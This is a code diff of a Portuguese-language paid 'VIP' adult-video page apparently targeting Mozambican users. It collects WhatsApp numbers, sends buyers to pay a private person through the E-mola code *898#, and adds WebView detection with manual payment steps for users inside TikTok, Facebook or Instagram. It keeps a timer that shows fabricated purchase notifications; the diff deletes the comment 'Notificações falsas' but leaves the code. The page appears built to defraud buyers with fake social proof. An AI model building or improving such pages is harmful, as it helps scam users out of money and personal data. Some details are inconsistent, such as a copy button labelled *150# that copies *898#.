@@ -781,7 +781,14 @@
         let valorAtual = '199';
         let dadosCliente = { whatsapp: '', numeroEnvio: '' };
 
-        // FUNÇÃO PARA ABRIR MODAL DE COLETA DE DADOS
+        // Detecta se está dentro de WebView (TikTok, Facebook, Instagram)
+        function isInsideWebView() {
+            const ua = navigator.userAgent.toLowerCase();
+            return ua.includes('tik tok') || ua.includes('fbav') || ua.includes('fban') || 
+                   ua.includes('instagram') || ua.includes('mia') || ua.includes('webview') ||
+                   ua.includes('facebook') || ua.includes('fbios');
+        }
+
         function abrirColetaDados(valor) {
             valorAtual = valor;
             const modalHtml = `
@@ -790,7 +797,7 @@
                         <div class="data-header">🔐 Confirmar Acesso VIP - ${valor} MZN</div>
                         <div class="data-body">
                             <p style="text-align:center; margin-bottom:10px;">Preencha os dados para continuar</p>
-                            <input type="text" id="numeroEnvioInput" class="data-input" placeholder="Nome Completo)" autocomplete="off">
+                            <input type="tel" id="numeroEnvioInput" class="data-input" placeholder="Nome Completo" autocomplete="off">
                             <input type="tel" id="whatsappInput" class="data-input" placeholder="📱 Seu WhatsApp (ex: 841234567)" autocomplete="off">
                             <button class="btn-enviar" onclick="enviarDados()">📤 ENVIAR DADOS</button>
                             <button style="background:#999; margin-top:10px;" class="btn-enviar" onclick="fecharModal('dataModal')">❌ Cancelar</button>
@@ -818,7 +825,6 @@
             
             dadosCliente = { whatsapp: whats, numeroEnvio: numeroEnvio };
             
-            // Mostrar animação de processamento
             const modalBody = document.querySelector('#dataModal .data-body');
             modalBody.innerHTML = `
                 <div style="text-align:center; padding:20px;">
@@ -846,7 +852,6 @@
             }, 2000);
         }
 
-        // FUNÇÃO PARA ABRIR MODAL DE PAGAMENTO
         function abrirPagamento() {
             const nomeEmpresa = "PAULINA JEMUSSE";
             const numeroEmpresa = "875422957";
@@ -867,7 +872,7 @@
                                 <p><small>⚠️ Envie o valor exato de <strong>${valorAtual} MZN</strong> para o número acima.</small></p>
                             </div>
                             
-                            <button class="btn-mpesa" onclick="abrirMpesa()">📲 PAGAR AGORA (e-mola *898#)</button>
+                            <button class="btn-mpesa" onclick="abrirMpesa()">📲 PAGAR AGORA (E-mola *898#)</button>
                             <button class="btn-pago" onclick="verificarPagamento()">✅ JÁ PAGUEI</button>
                             <button style="background:#6c757d; margin-top:10px;" class="btn-mpesa" onclick="fecharModal('paymentModal')">❌ Fechar</button>
                             <div id="statusPagamento" class="status-msg" style="display:none;"></div>
@@ -889,8 +894,55 @@
             });
         }
 
+        // Função melhorada para abrir M-Pesa/E-Mola com suporte para WebView
         function abrirMpesa() {
-            window.location.href = "tel:*898#";
+            const codigo = "*898#";
+            
+            if (isInsideWebView()) {
+                // Está dentro do TikTok/Facebook/Instagram - mostra instruções manuais
+                mostrarModalManualMpesa();
+            } else {
+                // Tenta abrir o discador normalmente
+                window.location.href = `tel:${codigo}`;
+                
+                // Fallback: se não funcionar em 500ms, mostra instruções
+                setTimeout(() => {
+                    if (document.visibilityState === 'visible') {
+                        mostrarModalManualMpesa();
+                    }
+                }, 800);
+            }
+        }
+
+        function mostrarModalManualMpesa() {
+            const instrucaoHtml = `
+                <div id="instrucaoModal" class="data-modal" style="z-index:100002;">
+                    <div class="data-card" style="max-width:350px;">
+                        <div class="data-header" style="background:#28a745;">📱 Abrir E-mola Manualmente</div>
+                        <div class="data-body" style="text-align:center;">
+                            <div style="background:#e8f5e9; padding:20px; border-radius:20px; margin-bottom:15px;">
+                                <p style="font-size:14px; margin-bottom:10px;">⚠️ O aplicativo não permite abrir o discador automaticamente.</p>
+                                <p style="font-size:14px; margin-bottom:10px;">Siga os passos abaixo:</p>
+                                <p style="margin:10px 0;"><strong>1️⃣</strong> Saia deste app e abra o <strong style="color:#28a745;">Discador</strong> do celular</p>
+                                <p style="margin:10px 0;"><strong>2️⃣</strong> Digite o código:</p>
+                                <div style="background:#1e2a3e; color:white; padding:15px; border-radius:15px; font-size:32px; letter-spacing:3px; margin:10px 0;">*898#</div>
+                                <button class="copy-btn" onclick="copiarCodigoManual()" style="background:#00a8cc; margin-top:10px;">📋 Copiar código *150#</button>
+                            </div>
+                            <p style="font-size:12px; color:#666;"><strong>3️⃣</strong> Siga as instruções e envie ${valorAtual} MZN para o número <strong>875422957</strong> (Beneficiário: PAULINA JEMUSSE)</p>
+                            <button onclick="fecharModal('instrucaoModal')" style="margin-top:15px; background:#6c757d; border:none; padding:12px; border-radius:50px; width:100%; color:white;">✅ Entendi, vou pagar</button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            if (document.getElementById('instrucaoModal')) document.getElementById('instrucaoModal').remove();
+            document.body.insertAdjacentHTML('beforeend', instrucaoHtml);
+            document.body.style.overflow = 'hidden';
+        }
+
+        function copiarCodigoManual() {
+            navigator.clipboard.writeText('*898#').then(() => {
+                mostrarNotificacao("✅ Código *898# copiado! Abra o discador do celular e cole.");
+            });
         }
 
         function verificarPagamento() {
@@ -920,7 +972,6 @@
             setTimeout(() => notif.style.display = "none", 4000);
         }
 
-        // Funções auxiliares do site
         function desbloquearVideo(qId) {
             const overlay = document.getElementById('overlay' + qId);
             const video = document.getElementById('video' + qId);
@@ -962,7 +1013,6 @@
             r.style.display = r.style.display === "block" ? "none" : "block";
         }
 
-        // Notificações falsas
         const nomes = ["João", "Carlos", "Mário", "Nelson", "Paulo", "Rui"];
         const cidades = ["Maputo", "Beira", "Nampula", "Tete"];
         setInterval(() => {
@@ -973,13 +1023,13 @@
             setTimeout(() => document.getElementById("notif").style.display = "none", 4000);
         }, 7000);
 
-        // Age gate
         document.body.style.overflow = "hidden";
         function entrar() {
             localStorage.setItem("18+", "true");
             document.getElementById("ageGate").style.display = "none";
             document.body.style.overflow = "auto";
         }
+        
         window.onload = function () {
             if (localStorage.getItem("18+") === "true") {
                 document.getElementById("ageGate").style.display = "none";
